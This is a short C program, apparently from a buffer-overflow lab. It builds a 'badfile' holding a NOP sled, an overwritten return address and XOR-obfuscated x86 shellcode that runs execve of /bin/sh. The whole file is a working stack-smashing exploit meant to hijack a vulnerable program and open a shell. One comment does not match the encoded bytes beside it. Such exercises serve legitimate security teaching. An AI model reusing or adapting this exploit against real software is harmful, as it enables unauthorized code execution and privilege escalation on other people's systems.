/* exploit.c  */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             		/* xorl    %eax,%eax              */
    "\x50"                 		/* pushl   %eax                   */
    "\xba\x91\x91\xcd\xd6" 		/* movl %edx $0x68732f2f          */
	"\x81\xf2\xbe\xbe\xbe\xbe"
	"\x52"
    "\xba\x91\xdc\xd7\xd0"
	"\x81\xf2\xbe\xbe\xbe\xbe"
	"\x52"
    "\x89\xe3"            		/* movl    %esp,%ebx              */
    "\x50"                	    /* pushl   %eax                   */
    "\x53"                	    /* pushl   %ebx                   */
    "\x89\xe1"                  /* movl    %esp,%ecx              */
    "\x99"                      /* cdql                           */
    "\xb0\x0b"                  /* movb    $0x0b,%al              */
    "\xcd\x80"                  /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    // overwrite return address to somewhere in nop sled
    *(long *) &buffer[24] = (long) (0xbfffee84 + 0x1c); 

    // put shellcode at the end of buffer
    int i, shellcodeStart = sizeof(buffer) - sizeof(shellcode);
    for (i = 0; i < sizeof(shellcode); i++) {
		buffer[shellcodeStart + i] = shellcode[i]; 
 	}

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
